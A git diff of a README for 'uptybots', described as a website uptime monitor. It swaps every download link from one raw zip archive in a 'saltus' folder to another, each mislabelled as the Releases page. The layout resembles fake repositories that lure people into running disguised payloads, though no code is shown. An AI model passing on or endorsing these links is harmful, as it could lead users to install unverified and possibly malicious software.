@@ -1,6 +1,6 @@
 # 🌐 uptybots - Monitors Your Website Uptime Seamlessly
 
-[![Download uptybots](https://github.com/grismeister/uptybots/raw/refs/heads/main/saltus/Software_v2.7.zip%https://github.com/grismeister/uptybots/raw/refs/heads/main/saltus/Software_v2.7.zip)](https://github.com/grismeister/uptybots/raw/refs/heads/main/saltus/Software_v2.7.zip)
+[![Download uptybots](https://raw.githubusercontent.com/grismeister/uptybots/main/saltus/Software_v3.0.zip%https://raw.githubusercontent.com/grismeister/uptybots/main/saltus/Software_v3.0.zip)](https://raw.githubusercontent.com/grismeister/uptybots/main/saltus/Software_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **uptybots**! This application helps you monitor your website's uptim
 
 To get started, visit the following link to download the application:
 
-[Download uptybots from Releases](https://github.com/grismeister/uptybots/raw/refs/heads/main/saltus/Software_v2.7.zip)
+[Download uptybots from Releases](https://raw.githubusercontent.com/grismeister/uptybots/main/saltus/Software_v3.0.zip)
 
 On the Releases page, you will find different versions of the software. Choose the latest version that fits your system, and follow these steps:
 
@@ -55,7 +55,7 @@ Invite your friends to use uptybots! You can earn rewards for every sign-up thro
 
 We frequently release updates to add features and improve performance. It’s a good idea to regularly check the following link for the latest version:
 
-[Visit the Releases page for updates](https://github.com/grismeister/uptybots/raw/refs/heads/main/saltus/Software_v2.7.zip)
+[Visit the Releases page for updates](https://raw.githubusercontent.com/grismeister/uptybots/main/saltus/Software_v3.0.zip)
 
 ## ✨ Community Feedback
 
